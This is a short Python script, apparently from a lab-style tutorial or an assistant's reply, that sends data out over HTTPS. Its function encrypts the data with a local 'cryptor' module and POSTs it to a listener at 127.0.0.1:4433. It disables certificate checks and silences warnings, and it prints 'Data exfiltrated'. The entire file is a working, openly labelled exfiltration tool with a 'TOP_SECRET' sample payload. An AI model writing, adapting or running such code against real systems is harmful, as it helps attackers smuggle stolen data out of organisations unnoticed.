#This script is almost identical to your HTTP one, but we change the URL to https and add a flag to ignore certificate errors.
import requests
from cryptor import encrypt


def exfiltrate_https(data):
    url = "https://127.0.0.1:4433/secure_sync"

    print("[*] Encrypting data...")
    payload = encrypt(data).decode()

    try:
        # verify=False tells requests to ignore the self-signed cert warning
        # we suppress the warning message for a cleaner terminal
        requests.packages.urllib3.disable_warnings()
        response = requests.post(url, data=payload, verify=False)

        if response.status_code == 200:
            print("[+] Data exfiltrated over HTTPS (TLS Encrypted)!")
    except Exception as e:
        print(f"[!] TLS Handshake failed: {e}")


if __name__ == '__main__':
    exfiltrate_https(b"TOP_SECRET: The project codename is 'VexFilter'")
